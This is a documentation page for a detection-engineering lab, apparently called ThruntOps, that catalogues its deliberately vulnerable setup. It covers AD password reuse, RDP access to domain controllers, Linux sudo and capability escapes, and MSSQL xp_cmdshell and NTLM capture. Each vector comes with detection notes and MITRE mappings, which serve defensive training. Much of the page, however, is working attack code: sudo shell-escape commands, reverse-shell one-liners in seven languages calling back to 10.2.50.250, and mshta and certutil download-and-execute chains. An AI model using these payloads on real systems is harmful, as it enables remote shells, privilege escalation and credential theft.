---
title: Vulnerabilities
layout: default
nav_order: 7
---

{: .warning }
**Fase 2 — not yet deployed.** All vulnerability scenarios (ADCS, MSSQL, LOLBins, privesc) are planned for Fase 2. This documentation is preserved as implementation and testing reference.

{: .note }
**Role implementations live in [`ThruntOps-vulnerabilities`](https://github.com/enonethreezed/ThruntOps-vulnerabilities)**, which maintains its own [role matrix](https://github.com/enonethreezed/ThruntOps-vulnerabilities/blob/main/ansible/vulnerability-matrix.md) as the authoritative source for which Ansible role provisions each condition. This page keeps the ThruntOps-specific operational reference (exploitation steps, detection opportunities, MITRE mapping, attack chains) — it does not redefine roles.

# Vulnerabilities
{: .no_toc }

Attack surface and intentional vulnerability classes present in the ThruntOps lab.
{: .fs-6 .fw-300 }

---

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Active Directory

### Credential Reuse — Domain User to Domain Admin

| Field | Detail |
|---|---|
| **Accounts affected** | `primary_user01` (thruntops.domain), `secondary_user01` (secondary.thruntops.domain) |
| **Condition** | These accounts share the exact password of their respective `domainadmin` |
| **Primitive** | Low-privilege domain user credential → Domain Admin via password reuse |
| **MITRE ATT&CK** | [T1078.002 — Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |
| **Related techniques** | [T1110.001 — Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/), [T1110.004 — Credential Stuffing](https://attack.mitre.org/techniques/T1110/004/) |

**Attack path:**

```
Compromise primary_user01 (low-priv)
  → Recover plaintext / NTLM hash
  → Reuse credential against domainadmin
  → Full domain compromise (T1078.002)
```

**Detection opportunities:**

- Logon event with `domainadmin` originating from a workstation (Event ID 4624, logon type 3/10)
- Same NTLM hash seen across accounts of different privilege levels (requires credential dumping detection — T1003)
- Lateral movement from workstation to DC using admin credentials (Event ID 4769 / Kerberos TGS request for privileged service)

---

### RDP Access to Domain Controllers — Low-Privilege User

| Field | Detail |
|---|---|
| **Accounts affected** | `primary_user02` (thruntops.domain → DC01-2022), `secondary_user02` (secondary.thruntops.domain → DC01-SEC) |
| **Condition** | Low-privilege domain users are members of the `Remote Desktop Users` group on their respective domain controller |
| **Primitive** | Interactive session on a DC as a non-admin — enables local enumeration, memory access attempts, and token abuse |
| **MITRE ATT&CK** | [T1021.001 — Remote Services: Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/) |
| **Related techniques** | [T1078.002 — Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/), [T1003.001 — OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/) |

**Attack path:**

```
Compromise primary_user02 (low-priv)
  → RDP to DC01-2022 (T1021.001)
  → Interactive session on DC — LSASS in scope (T1003.001)
  → Dump credentials / escalate to Domain Admin
```

**Detection opportunities:**

- RDP logon to DC from non-admin account (Event ID 4624, logon type 10, source non-admin)
- Interactive session on DC from workstation IP (Event ID 4778 / 4779 — session connect/disconnect)
- Process creation under non-admin account on DC (Sysmon Event ID 1)

---

### RDP Access to ADCS — Low-Privilege Domain User

| Field | Detail |
|---|---|
| **Accounts affected** | `primary_user04` (thruntops.domain), `secondary_user04` (secondary.thruntops.domain) |
| **Condition** | Low-privilege domain users from both domains are members of `Remote Desktop Users` on the Certificate Authority (ADCS VM) |
| **Primitive** | Interactive session on the CA — enables certificate template enumeration, ESC abuse, and potential CA private key access |
| **MITRE ATT&CK** | [T1021.001 — Remote Services: Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/) |
| **Related techniques** | [T1649 — Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/), [T1078.002 — Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |

**Attack path:**

```
Compromise primary_user04 (low-priv)
  → RDP to ADCS (T1021.001)
  → Enumerate certificate templates — identify ESC misconfigurations
  → Request malicious certificate (T1649)
  → Authenticate as Domain Admin using certificate
```

**Detection opportunities:**

- RDP logon to ADCS from non-admin account (Event ID 4624, logon type 10)
- Certificate enrollment from unexpected account (Event ID 4886 / 4887 — certificate issued)
- Certify / Certipy tooling signatures in process creation logs (Sysmon Event ID 1)

---

## Linux Privilege Escalation

Entry point: `primary_user06` → ops (10.2.50.2).

### sudo ansible-playbook — Shell Escape to Root (ops)

| Field | Detail |
|---|---|
| **Host** | ops (10.2.50.2) |
| **Entry point** | `primary_user06` (SSH, restricted sudo) |
| **Condition** | `primary_user06` can run `/usr/bin/ansible-playbook` with sudo (NOPASSWD) |
| **Primitive** | ansible-playbook executes an arbitrary playbook as root — task with `shell` module spawns a root shell |
| **GTFOBins** | [ansible-playbook — sudo](https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo) |
| **MITRE ATT&CK** | [T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/) |

**Exploit:**

```bash
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > /tmp/x
sudo ansible-playbook /tmp/x
```

**Detection opportunities:**

- `ansible-playbook` executed via sudo by non-admin user (auditd syscall execve, euid=0)
- Playbook path in `/tmp` or user-writable directory

---

### sudo ansible-test — Shell Escape to Root (ops)

| Field | Detail |
|---|---|
| **Host** | ops (10.2.50.2) |
| **Entry point** | `primary_user06` (SSH, restricted sudo) |
| **Condition** | `primary_user06` can run `/usr/bin/ansible-test` with sudo (NOPASSWD) |
| **Primitive** | `ansible-test shell` drops to an interactive shell as root |
| **GTFOBins** | [ansible-test — sudo](https://gtfobins.github.io/gtfobins/ansible-test/#sudo) |
| **MITRE ATT&CK** | [T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/) |

**Exploit:**

```bash
sudo ansible-test shell
```

**Detection opportunities:**

- `ansible-test shell` executed via sudo (auditd)
- Interactive shell spawned from ansible-test with euid=0

---

### sudo certbot — Shell Escape to Root (ops)

| Field | Detail |
|---|---|
| **Host** | ops (10.2.50.2) |
| **Entry point** | `primary_user06` (SSH, restricted sudo) |
| **Condition** | `primary_user06` can run `/usr/bin/certbot` with sudo (NOPASSWD) |
| **Primitive** | certbot `--pre-hook` flag executes an arbitrary command as root before the certificate operation |
| **GTFOBins** | [certbot — sudo](https://gtfobins.github.io/gtfobins/certbot/#sudo) |
| **MITRE ATT&CK** | [T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/) |

**Exploit:**

```bash
sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x \
  --logs-dir /tmp --work-dir /tmp --config-dir /tmp \
  --pre-hook '/bin/sh 1>&0 2>&0'
```

**Detection opportunities:**

- `certbot` executed via sudo with `--pre-hook` argument (auditd process arguments)
- `/bin/sh` child of certbot with euid=0

---

### sudo watch — Shell Escape to Root (ops)

| Field | Detail |
|---|---|
| **Host** | ops (10.2.50.2) |
| **Entry point** | `primary_user06` (SSH, restricted sudo) |
| **Condition** | `primary_user06` can run `/usr/bin/watch` with sudo (NOPASSWD) |
| **Primitive** | watch executes the given command — passing a shell reset sequence drops to a root shell |
| **GTFOBins** | [watch — sudo](https://gtfobins.github.io/gtfobins/watch/#sudo) |
| **MITRE ATT&CK** | [T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/) |

**Exploit:**

```bash
sudo watch 'reset; exec /bin/sh 1>&0 2>&0'
```

**Detection opportunities:**

- `watch` executed via sudo with shell payload in command argument (auditd)
- `/bin/sh` child of watch with euid=0

---

## Reverse Shells

Available on the **ops** (10.2.50.2) Linux host.

**Prerequisites:** Kali must be deployed and reachable at `10.2.50.250`.

```bash
bash scripts/add-kali.sh   # if not already deployed
```

**Shell upgrade** (run after catching any reverse shell):

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

### PHP

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Linux host
php -r '$s=fsockopen("10.2.50.250",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

### Ruby

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Linux host
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.2.50.250","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

### Python

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Linux host
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.2.50.250",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

### Node.js

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Linux host
node -e 'var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var c=new net.Socket();c.connect(4444,"10.2.50.250",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'
```

---

### tclsh

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Linux host
echo 'set s [socket 10.2.50.250 4444];fconfigure $s -translation binary -buffering full;set p [open "|/bin/sh -i" r+];fconfigure $p -translation binary -buffering full;fileevent $s readable "set d [read $s];puts -nonewline $p $d;flush $p";fileevent $p readable "set d [read $p];puts -nonewline $s $d;flush $s";vwait forever' | tclsh
```

---

### Perl

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Linux host
perl -e 'use Socket;$i="10.2.50.250";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## Windows Reverse Shells

Available on all domain-joined Windows VMs: **DC01-2022** (10.2.50.11), **DC01-SEC** (10.2.50.12), **ADCS** (10.2.50.13), **WEB** (10.2.50.14), **WIN11-22H2-1** (10.2.50.21), **WIN11-22H2-2** (10.2.50.22).

**Prerequisites:** Kali at `10.2.50.250`. For download-based payloads, start an HTTP server on Kali first:

```bash
# Kali — serve files from current working directory
python3 -m http.server 8080
```

---

### PowerShell

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Windows host (cmd or PS prompt)
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('10.2.50.250',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()"
```

---

### mshta.exe

mshta executes HTML Application (`.hta`) files — VBScript/JScript runs with the full scripting host trust level, bypassing browser security zones.

```bash
# 1. Create shell.hta — Kali
cat > shell.hta << 'EOF'
<html><head><script language="VBScript">
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('10.2.50.250',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()""", 0, False
self.close
</script></head></html>
EOF

# 2. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 3. HTTP server — Kali (same directory as shell.hta)
python3 -m http.server 8080

# 4. Execute — target Windows host (cmd prompt)
mshta http://10.2.50.250:8080/shell.hta
```

---

### certutil

certutil is a built-in Windows certificate utility — its `-urlcache` flag downloads arbitrary files from HTTP.

```bash
# 1. Create shell.ps1 — Kali
cat > shell.ps1 << 'EOF'
$c=New-Object Net.Sockets.TCPClient('10.2.50.250',4444)
$s=$c.GetStream()
[byte[]]$b=0..65535|%{0}
while(($n=$s.Read($b,0,$b.Length)) -ne 0){
    $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n)
    $r=(iex $d 2>&1|Out-String)
    $rb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ')
    $s.Write($rb,0,$rb.Length);$s.Flush()
}
$c.Close()
EOF

# 2. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 3. HTTP server — Kali (same directory as shell.ps1)
python3 -m http.server 8080

# 4. Download and execute — target Windows host (cmd prompt)
certutil -urlcache -split -f http://10.2.50.250:8080/shell.ps1 C:\Windows\Temp\shell.ps1
powershell -nop -f C:\Windows\Temp\shell.ps1
```

---

### cscript

cscript runs Windows Script Host files in **console mode** — output is written to the calling terminal window.

```bash
# 1. Create shell.js — Kali
cat > shell.js << 'EOF'
var s = new ActiveXObject("WScript.Shell");
s.Run("powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('10.2.50.250',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()\"", 0, false);
EOF

# 2. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 3. HTTP server — Kali (same directory as shell.js)
python3 -m http.server 8080

# 4. Download and execute — target Windows host (cmd prompt)
certutil -urlcache -split -f http://10.2.50.250:8080/shell.js C:\Windows\Temp\shell.js
cscript //nologo C:\Windows\Temp\shell.js
```

---

### wscript

wscript runs the same Windows Script Host files in **GUI (windowless) mode** — no console window appears on the target host.

```bash
# 1–3. Same as cscript — create shell.js on Kali, start listener, start HTTP server

# 4. Download and execute (windowless) — target Windows host (cmd prompt)
certutil -urlcache -split -f http://10.2.50.250:8080/shell.js C:\Windows\Temp\shell.js
wscript //nologo C:\Windows\Temp\shell.js
```

---

## Linux Capabilities

### cap_gdb — CAP_SETUID → Root Shell (ops)

| Field | Detail |
|---|---|
| **Host** | ops (10.2.50.2) |
| **Entry point** | Any user with SSH access (no sudo required) |
| **Condition** | `/usr/bin/gdb` has `cap_setuid+eip` capability set |
| **Primitive** | gdb's Python interpreter calls `os.setuid(0)` — capability allows the setuid syscall without SUID bit — then drops to a root shell |
| **GTFOBins** | [gdb — Capabilities](https://gtfobins.github.io/gtfobins/gdb/#capabilities) |
| **MITRE ATT&CK** | [T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) |

**Exploit:**

```bash
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit /dev/null
```

**Attack path:**

```
SSH as any user (no sudo)
  → Enumerate capabilities: getcap -r / 2>/dev/null
  → Identify /usr/bin/gdb with cap_setuid+eip
  → gdb Python: os.setuid(0) → !sh → root shell (T1548.001)
```

**Detection opportunities:**

- `gdb` process spawning `/bin/sh` with euid=0 from non-root user (auditd execve, euid field)
- `getcap` enumeration on the filesystem (process arguments)
- Python `setuid` syscall from gdb context

---

## MSSQL

{: .note }
No dedicated VM is assigned to this vector yet (the previous plan hosted it on a combined WEB/IIS server, now dropped from the roadmap — see [Notes](#notes)). Scenarios below describe the intended SQL Server-side conditions; the entry point (how an attacker first reaches SQL Server) depends on where MSSQL ends up being deployed.

MSSQL Server 2019, mixed-mode authentication enabled, SA account active with a known lab password. The `thruntops\DBA` group has sysadmin rights.

---

### xp_cmdshell — OS Command Execution via SQL

| Field | Detail |
|---|---|
| **Host** | TBD — MSSQL host not yet assigned |
| **Entry point** | SA credentials or `thruntops\DBA` group member |
| **Condition** | SA account is sysadmin; `xp_cmdshell` can be enabled via `sp_configure` |
| **Primitive** | SA or sysadmin executes OS commands as the MSSQL service account (`NT SERVICE\MSSQLSERVER`) |
| **MITRE ATT&CK** | [T1059.003 — Command and Scripting Interpreter: Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/) |

**Exploit:**

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute OS command
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -nop -w hidden -c "<reverse shell>"';
```

**Detection opportunities:**

- `sp_configure 'xp_cmdshell'` execution (SQL Server audit — Event Class: Object:Altered)
- `sqlservr.exe` spawning `cmd.exe` or `powershell.exe` (Sysmon Event ID 1)
- `xp_cmdshell` in SQL batch text (SQL Server trace / Extended Events)

---

### NTLM Hash Capture via xp_dirtree

| Field | Detail |
|---|---|
| **Host** | TBD — MSSQL host not yet assigned |
| **Entry point** | SA credentials or sysadmin-equivalent account |
| **Condition** | `xp_dirtree` or `xp_fileexist` initiates an SMB connection to an attacker-controlled host — MSSQL service account sends an NTLM authentication challenge |
| **Primitive** | Capture `NT SERVICE\MSSQLSERVER` NTLM hash → crack offline → or relay to another service |
| **MITRE ATT&CK** | [T1187 — Forced Authentication](https://attack.mitre.org/techniques/T1187/) |

**Exploit:**

```bash
# 1. Start Responder on Kali
responder -I eth0 -wPv

# 2. Trigger NTLM auth from MSSQL
EXEC xp_dirtree '\\10.2.50.250\share'
```

**Detection opportunities:**

- `xp_dirtree` or `xp_fileexist` with UNC path to non-domain host (SQL Server audit)
- Outbound SMB connection from the MSSQL host to attacker IP (network traffic, port 445)
- Responder / NTLM capture signatures in network logs

---

### DBA Group → Sysadmin Escalation

| Field | Detail |
|---|---|
| **Host** | TBD — MSSQL host not yet assigned |
| **Entry point** | `primary_user07` (DBA group member, thruntops.domain) |
| **Condition** | `thruntops\DBA` AD group is mapped to the `sysadmin` server role in MSSQL |
| **Primitive** | Domain user in DBA group has full sysadmin rights on MSSQL — can enable xp_cmdshell, read all databases, impersonate any login |
| **MITRE ATT&CK** | [T1078.002 — Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |

**Attack path:**

```
Compromise primary_user07 credentials
  → Connect to MSSQL (Windows auth via RDP or WinRM)
  → SELECT IS_SRVROLEMEMBER('sysadmin')  → 1
  → Enable xp_cmdshell → OS command execution as MSSQL service account
```

**Detection opportunities:**

- Unexpected Windows auth MSSQL login from non-service account (SQL Server audit)
- `IS_SRVROLEMEMBER('sysadmin')` or role enumeration queries
- `sp_configure` / `xp_cmdshell` activity from DBA account

---

## By Technology

| Technology | Vectors |
|---|---|
| Active Directory (dual domain) | Credential reuse, Kerberoasting, AS-REP roasting, ACL abuse, lateral movement, trust abuse |
| ADCS | ESC1–ESC16 certificate template misconfigurations, RDP access to CA |
| MSSQL | xp_cmdshell (OS execution), xp_dirtree (NTLM capture), DBA group → sysadmin escalation — host TBD |
| Linux — ops | Restricted sudo escape (ansible-playbook, ansible-test, certbot, watch), capabilities (gdb/CAP_SETUID), reverse shells |
| Windows — all domain VMs | Reverse shells (PowerShell, mshta.exe, certutil, cscript, wscript) |
| Elastic SIEM | Detection engineering, alert tuning, log analysis |

## Notes

- Passwords are randomised but `primary_user01` / `secondary_user01` intentionally share their domain admin password
- No password policy enforced on the domain
- ADCS is configured with intentionally misconfigured templates to enable ESC attack paths
- Domain trust between `thruntops.domain` and `secondary.thruntops.domain` enables cross-domain lateral movement
- WEB and GitLab CE were dropped from the roadmap; MSSQL remains planned but without an assigned VM yet
- Linux privesc scenarios (ops) are present on all profiles
